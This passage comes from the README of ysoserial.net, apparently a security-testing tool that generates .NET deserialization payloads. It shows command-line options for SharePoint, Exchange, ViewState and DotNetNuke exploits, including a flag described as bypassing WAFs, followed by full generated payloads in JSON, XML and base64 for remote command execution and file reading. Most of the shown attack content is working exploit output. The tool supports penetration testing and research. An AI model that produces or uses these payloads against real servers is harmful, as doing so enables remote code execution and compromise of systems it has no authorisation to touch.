CVE-2018-8421)\n\t\tOptions:\n\t\t      --cve=VALUE            the CVE reference: CVE-2020-1147 (result is safe \n\t\t                               for a POST request), CVE-2019-0604, CVE-2018-8421\n\t\t      --useurl               to use the XAML url rather than using the direct \n\t\t                               command in CVE-2019-0604 and CVE-2018-8421\n\t\t  -g, --gadget=VALUE         a gadget chain that supports LosFormatter for \n\t\t                               CVE-2020-1147. Default: TypeConfuseDelegate \n\t\t  -c, --command=VALUE        the command to be executed e.g. \"cmd /c calc\" or \n\t\t                               the XAML url e.g. \"http://b8.ee/x\" to make the \n\t\t                               payload shorter with the `--useurl` argument\n\t\t\n\t(*) ThirdPartyGadgets (Implements gadgets for 3rd Party Libraries)\n\t\tOptions:\n\t\t  -l                         prints list of implemented gadgets\n\t\t  -i, --input=VALUE          input to the gadget\n\t\t  -g, --gadget=VALUE         gadget to use\n\t\t  -f, --formatter=VALUE      formatter to use\n\t\t  -r                         removes version and pubkeytoken from types, it \n\t\t                               may be useful when we do not know the version of \n\t\t                               targeted library or require a short payload\n\t\t  -t                         test gadget (execute after generation)\n\t\t      --minify               minify gadget\n\t\t\n\t(*) TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)\n\t\tOptions:\n\t\t  -c, --command=VALUE        the command to be executed\n\t\t  -t, --test                 whether to run payload locally. Default: false\n\t\t      --minify               Whether to minify the payloads where applicable \n\t\t                               (experimental). Default: false\n\t\t      --ust, --usesimpletype This is to remove additional info only when \n\t\t                               minifying and FormatterAssemblyStyle=Simple. \n\t\t                               Default: true\n\t\t\n\t(*) ViewState (Generates a ViewState using known MachineKey parameters)\n\t\tOptions:\n\t\t      --examples             Show a few examples. Other parameters will be \n\t\t                               ignored.\n\t\t      --dryrun               Create a valid ViewState without using an \n\t\t                               exploit payload. The gadget and command \n\t\t                               parameters will be ignored.\n\t\t  -g, --gadget=VALUE         A gadget chain that supports LosFormatter. \n\t\t                               Default: ActivitySurrogateSelector.\n\t\t  -c, --command=VALUE        The command suitable for the used gadget (will \n\t\t                               be ignored for ActivitySurrogateSelector).\n\t\t      --rawcmd               Command will be executed as is without `cmd /c ` \n\t\t                               being appended (anything after the first space \n\t\t                               is an argument).\n\t\t  -s, --stdin                The command to be executed will be read from \n\t\t                               standard input.\n\t\t      --usp, --unsignedpayload=VALUE\n\t\t                             The unsigned LosFormatter payload (base64 \n\t\t                               encoded). The gadget and command parameters will \n\t\t                               be ignored.\n\t\t      --isfileusp            Indicates that the unsigned payload contains a \n\t\t                               file name (e.g., payload.txt).\n\t\t      --vsg, --generator=VALUE\n\t\t                             The __VIEWSTATEGENERATOR value in HEX, useful \n\t\t                               for .NET <= 4.0. When not empty, 'legacy' will \n\t\t                               be used and 'path' and 'apppath' will be ignored.\n\t\t      --path=VALUE           The target web page. Example: /app/folder1/pag-\n\t\t                               e.aspx.\n\t\t      --pathisclass          Indicates that the path is a class name and \n\t\t                               should not be modified.\n\t\t      --apppath=VALUE        The application path. Needed to simulate \n\t\t                               TemplateSourceDirectory.\n\t\t      --islegacy             Use the legacy algorithm suitable for .NET 4.0 \n\t\t                               and below.\n\t\t      --isencrypted          Use when the legacy algorithm is used to bypass \n\t\t                               WAFs.\n\t\t      --vsuk, --viewstateuserkey=VALUE\n\t\t                             Sets the ViewStateUserKey parameter, sometimes \n\t\t                               used as the anti-CSRF token.\n\t\t      --da, --decryptionalg=VALUE\n\t\t                             The encryption algorithm can be set to DES, 3DE-\n\t\t                               S, or AES. Default: AES.\n\t\t      --dk, --decryptionkey=VALUE\n\t\t                             The decryptionKey attribute from machineKey in \n\t\t                               the web.config file.\n\t\t      --va, --validationalg=VALUE\n\t\t                             The validation algorithm can be set to SHA1, \n\t\t                               HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, \n\t\t                               or AES. Default: HMACSHA256.\n\t\t      --vk, --validationkey=VALUE\n\t\t                             The validationKey attribute from machineKey in \n\t\t                               the web.config file.\n\t\t      --showraw              Stop URL-encoding the result. Default: false.\n\t\t      --minify               Minify the payloads where applicable \n\t\t                               (experimental). Default: false.\n\t\t      --ust, --usesimpletype Remove additional info only when minifying and \n\t\t                               FormatterAssemblyStyle=Simple. Default: true.\n\t\t      --isdebug              Show useful debugging messages.\n\t\t\n\nNote: Machine authentication code (MAC) key modifier is not being used for LosFormatter in ysoserial.net. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.\n\nUsage: ysoserial.exe [options]\nOptions:\n  -p, --plugin=VALUE         The plugin to be used.\n  -o, --output=VALUE         The output format (raw|base64|raw-\n                               urlencode|base64-urlencode|hex).\n  -g, --gadget=VALUE         The gadget chain.\n  -f, --formatter=VALUE      The formatter.\n  -c, --command=VALUE        The command to be executed.\n      --rawcmd               Command will be executed as is without `cmd /c ` \n                               being appended (anything after first space is an \n                               argument).\n  -s, --stdin                The command to be executed will be read from \n                               standard input.\n      --bgc, --bridgedgadgetchains=VALUE\n                             Chain of bridged gadgets separated by comma (,). \n                               Each gadget will be used to complete the next \n                               bridge gadget. The last one will be used in the \n                               requested gadget. This will be ignored when \n                               using the searchformatter argument.\n  -t, --test                 Whether to run payload locally. Default: false\n      --outputpath=VALUE     The output file path. It will be ignored if \n                               empty.\n      --minify               Whether to minify the payloads where applicable. \n                               Default: false\n      --ust, --usesimpletype This is to remove additional info only when \n                               minifying and FormatterAssemblyStyle=Simple \n                               (always `true` with `--minify` for binary \n                               formatters). Default: true\n      --raf, --runallformatters\n                             Whether to run all the gadgets with the provided \n                               formatter (ignores gadget name, output format, \n                               and the test flag arguments). This will search \n                               in formatters and also show the displayed \n                               payload length. Default: false\n      --sf, --searchformatter=VALUE\n                             Search in all formatters to show relevant \n                               gadgets and their formatters (other parameters \n                               will be ignored).\n      --debugmode            Enable debugging to show exception errors and \n                               output length\n  -h, --help                 Shows this message and exit.\n      --fullhelp             Shows this message + extra options for gadgets \n                               and plugins and exit.\n      --credit               Shows the credit/history of gadgets and plugins \n                               (other parameters will be ignored).\n      --runmytest            Runs that `Start` method of `TestingArenaHome` - \n                               useful for testing and debugging.\n```\n\n*Note:* When specifying complex commands, it can be tedious to escape some special character (;, |, &, ..). Use stdin option (-s) to read the command from stdin:\n\n```\ncat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s\n```\n\n*Note:* XmlSerializer and DataContractSerializer formatters generate a wrapper Xml format including the expected type on the \"type\" attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated xml based on how XmlSerializer gets the expected type in your case.\n\n## Plugins\nYsoserial.Net can be used to generate raw payloads or more complex ones using a plugin architecture. To use plugins, use `-p <plugin name>` followed by the plugin options (the rest of ysoserial.net options will be ignored). Eg:\n\n```\n$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini\n```\n\nFor more help on plugin options use `-h` along with `-p <plugin name>`. Eg:\n\n```\n$ ./ysoserial.exe -h -p DotNetNuke\n\nysoserial.net generates deserialization payloads for a variety of .NET formatters.\n\nPlugin:\n\nDotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)\n\nOptions:\n\n  -m, --mode=VALUE           the payload mode: read_file, write_file, run_command.\n  -c, --command=VALUE        the command to be executed in run_command mode.\n  -u, --url=VALUE            the url to fetch the file from in write_file mode.\n  -f, --file=VALUE           the file to read in read_file mode or the file to write to in write_file_mode.\n      --minify               Whether to minify the payloads where applicable (experimental). Default: false\n      --ust, --usesimpletype This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true\n```\n\n## Examples\n\n### Generate a **calc.exe** payload for Json.Net using *ObjectDataProvider* gadget.\n```\n$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c \"calc\" -t\n\n{\n    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\n    'MethodName':'Start',\n    'MethodParameters':{\n        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',\n        '$values':['cmd','/ccalc']\n    },\n    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}\n}\n```\n\n### Generate a **calc.exe** payload for BinaryFormatter using *PSObject* gadget.\n```\n$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c \"calc\" -t\n\nAAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLCBWZXJzaW9uPTMuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAAJVN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QBAAAABkNsaVhtbAECAAAABgMAAACJFQ0KPE9ianMgVmVyc2lvbj0iMS4xLjAuMSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vcG93ZXJzaGVsbC8yMDA0LzA0Ij4mI3hEOw0KPE9iaiBSZWZJZD0iMCI+JiN4RDsNCiAgICA8VE4gUmVmSWQ9IjAiPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZSNTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uL1J1bnNwYWNlSW52b2tlNTwvVD4mI3hEOw0KICAgICAgPFQ+TWljcm9zb2Z0Lk1hbmFnZW1lbnQuSW5mcmFzdHJ1Y3R1cmUuQ2ltSW5zdGFuY2UjUnVuc3BhY2VJbnZva2U1PC9UPiYjeEQ7DQogICAgICA8VD5NaWNyb3NvZnQuTWFuYWdlbWVudC5JbmZyYXN0cnVjdHVyZS5DaW1JbnN0YW5jZTwvVD4mI3hEOw0KICAgICAgPFQ+U3lzdGVtLk9iamVjdDwvVD4mI3hEOw0KICAgIDwvVE4+JiN4RDsNCiAgICA8VG9TdHJpbmc+UnVuc3BhY2VJbnZva2U1PC9Ub1N0cmluZz4mI3hEOw0KICAgIDxPYmogUmVmSWQ9IjEiPiYjeEQ7DQogICAgICA8VE5SZWYgUmVmSWQ9IjAiIC8+JiN4RDsNCiAgICAgIDxUb1N0cmluZz5SdW5zcGFjZUludm9rZTU8L1RvU3RyaW5nPiYjeEQ7DQogICAgICA8UHJvcHM+JiN4RDsNCiAgICAgICAgPE5pbCBOPSJQU0NvbXB1dGVyTmFtZSIgLz4mI3hEOw0KCQk8T2JqIE49InRlc3QxIiBSZWZJZCA9IjIwIiA+ICYjeEQ7DQogICAgICAgICAgPFROIFJlZklkPSIxIiA+ICYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uV2luZG93cy5NYXJrdXAuWGFtbFJlYWRlcltdLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9UPiYjeEQ7DQogICAgICAgICAgICA8VD5TeXN0ZW0uQXJyYXk8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPFMgTj0iSGFzaCIgPiAgDQoJCSZsdDtSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSImZ3Q7DQoJICZsdDtPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgJmd0Ow0KICAgICAmbHQ7T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnMmZ3Q7DQogICAgICAgICZsdDtTeXN0ZW06U3RyaW5nJmd0O2NtZCZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgICAgJmx0O1N5c3RlbTpTdHJpbmcmZ3Q7L2MgImNhbGMiICZsdDsvU3lzdGVtOlN0cmluZyZndDsNCiAgICAgJmx0Oy9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycyZndDsNCiAgICAmbHQ7L09iamVjdERhdGFQcm92aWRlciZndDsNCiZsdDsvUmVzb3VyY2VEaWN0aW9uYXJ5Jmd0Ow0KCQkJPC9TPiYjeEQ7DQogICAgICAgICAgPC9MU1Q+JiN4RDsNCiAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgIDwvUHJvcHM+JiN4RDsNCiAgICAgIDxNUz4mI3hEOw0KICAgICAgICA8T2JqIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIj4gJiN4RDsNCiAgICAgICAgICA8VE4gUmVmSWQ9IjEiID4gJiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3Q8L1Q+JiN4RDsNCiAgICAgICAgICAgIDxUPlN5c3RlbS5PYmplY3Q8L1Q+JiN4RDsNCiAgICAgICAgICA8L1ROPiYjeEQ7DQogICAgICAgICAgPExTVD4mI3hEOw0KICAgICAgICAgICAgPE9iaiBSZWZJZD0iMyI+ICYjeEQ7DQogICAgICAgICAgICAgIDxNUz4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49IkNsYXNzTmFtZSI+UnVuc3BhY2VJbnZva2U1PC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPFMgTj0iTmFtZXNwYWNlIj5TeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uPC9TPiYjeEQ7DQogICAgICAgICAgICAgICAgPE5pbCBOPSJTZXJ2ZXJOYW1lIiAvPiYjeEQ7DQogICAgICAgICAgICAgICAgPEkzMiBOPSJIYXNoIj40NjA5MjkxOTI8L0kzMj4mI3hEOw0KICAgICAgICAgICAgICAgIDxTIE49Ik1pWG1sIj4gJmx0O0NMQVNTIE5BTUU9IlJ1bnNwYWNlSW52b2tlNSIgJmd0OyZsdDtQUk9QRVJUWSBOQU1FPSJ0ZXN0MSIgVFlQRSA9InN0cmluZyIgJmd0OyZsdDsvUFJPUEVSVFkmZ3Q7Jmx0Oy9DTEFTUyZndDs8L1M+JiN4RDsNCiAgICAgICAgICAgICAgPC9NUz4mI3hEOw0KICAgICAgICAgICAgPC9PYmo+JiN4RDsNCiAgICAgICAgICA8L0xTVD4mI3hEOw0KICAgICAgICA8L09iaj4mI3hEOw0KICAgICAgPC9NUz4mI3hEOw0KICAgIDwvT2JqPiYjeEQ7DQogICAgPE1TPiYjeEQ7DQogICAgICA8UmVmIE49Il9fQ2xhc3NNZXRhZGF0YSIgUmVmSWQgPSIyIiAvPiYjeEQ7DQogICAgPC9NUz4mI3hEOw0KICA8L09iaj4mI3hEOw0KPC9PYmpzPgs=\n```\n\n### Generate a run_command payload for DotNetNuke using its plugin\n```\n$ ./ysoserial.exe -p DotNetNuke -m run_command -c calc.exe\n\n<profile><item key=\"foo\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsd=\" [http://www.w3.org/2001/XMLSchema](http://www.w3.org/2001/XMLSchema) \" xmlns:xsi=\" [http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance) \"><ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">/wEyxBEAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAACy9jIGNhbGMuZXhlBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs=</anyType></MethodParameters><ObjectInstance xsi:type=\"ObjectStateFormatter\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>\n```\n\n### Generate a read_file payload for DotNetNuke using its plugin\n```\n$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini\n\n<profile><item key=\"name1: key1\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type=\"xsd:string\">win.ini</anyType></MethodParameters><ObjectInstance xsi:type=\"FileSystemUtils\"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>\n```\n\n### Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.\n```\n> .\\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust\n\nAAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKgfQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFWlRlWE4wWlcwc1ZtVnljMmx2YmowMExqQXVNQzR3TEVOMWJIUjFjbVU5Ym1WMWRISmhiQ3hRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJRRUFBQUJBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV011VTI5eWRHVmtVMlYwWURGYlcxTjVjM1JsYlM1VGRISnBibWNzYlhOamIzSnNhV0pkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSVNWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxrTnZiWEJoY21semIyNURiMjF3WVhKbGNtQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxHMXpZMjl5YkdsaVhWMElBZ0FBQUFJQUFBQUpBd0FBQUFJQUFBQUpCQUFBQUFRREFBQUFTVk41YzNSbGJTNURiMnhzWldOMGFXOXVjeTVIWlc1bGNtbGpMa052YlhCaGNtbHpiMjVEYjIxd1lYSmxjbUF4VzF0VGVYTjBaVzB1VTNSeWFXNW5MRzF6WTI5eWJHbGlYVjBCQUFBQUMxOWpiMjF3WVhKcGMyOXVBeUpUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUVVBQUFBUkJBQUFBQUlBQUFBR0JnQUFBQUFHQndBQUFQMExQRkpsYzI5MWNtTmxSR2xqZEdsdmJtRnllU0I0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenBoUFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJZ2VHMXNibk02WWowaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlJSGh0Ykc1ek9tTTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtOdmJtWnBaM1Z5WVhScGIyNDdZWE56WlcxaWJIazlVM2x6ZEdWdExrTnZibVpwWjNWeVlYUnBiMjRpSUhodGJHNXpPbVE5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdExsSmxabXhsWTNScGIyNDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnWVRwTFpYazlJblI1Y0dVaUlFOWlhbVZqZEZSNWNHVTlJbnRoT2xSNWNHVWdZanBVZVhCbGZTSWdUV1YwYUc5a1RtRnRaVDBpUjJWMFZIbHdaU0krUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1TlpYUm9iMlJRWVhKaGJXVjBaWEp6UGp4aU9sTjBjbWx1Wno1VGVYTjBaVzB1VjI5eWEyWnNiM2N1UTI5dGNHOXVaVzUwVFc5a1pXd3VRWEJ3VTJWMGRHbHVaM01zVTNsemRHVnRMbGR2Y210bWJHOTNMa052YlhCdmJtVnVkRTF2WkdWc0xGWmxjbk5wYjI0OU5DNHdMakF1TUN4RGRXeDBkWEpsUFc1bGRYUnlZV3dzVUhWaWJHbGpTMlY1Vkc5clpXNDlNekZpWmpNNE5UWmhaRE0yTkdVek5Ud3ZZanBUZEhKcGJtYytQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKbWFXVnNaQ0lnVDJKcVpXTjBTVzV6ZEdGdVkyVTlJbnRUZEdGMGFXTlNaWE52ZFhKalpTQjBlWEJsZlNJZ1RXVjBhRzlrVG1GdFpUMGlSMlYwUm1sbGJHUWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4WWpwVGRISnBibWMrWkdsellXSnNaVUZqZEdsMmFYUjVVM1Z5Y205bllYUmxVMlZzWldOMGIzSlVlWEJsUTJobFkyczhMMkk2VTNSeWFXNW5QanhrT2tKcGJtUnBibWRHYkdGbmN6NDBNRHd2WkRwQ2FXNWthVzVuUm14aFozTStQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKelpYUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdVM1JoZEdsalVtVnpiM1Z5WTJVZ1ptbGxiR1I5SWlCTlpYUm9iMlJPWVcxbFBTSlRaWFJXWVd4MVpTSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2s5aWFtVmpkQzgrUEdJNlFtOXZiR1ZoYmo1MGNuVmxQQzlpT2tKdmIyeGxZVzQrUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVRXVjBhRzlrVUdGeVlXMWxkR1Z5Y3o0OEwwOWl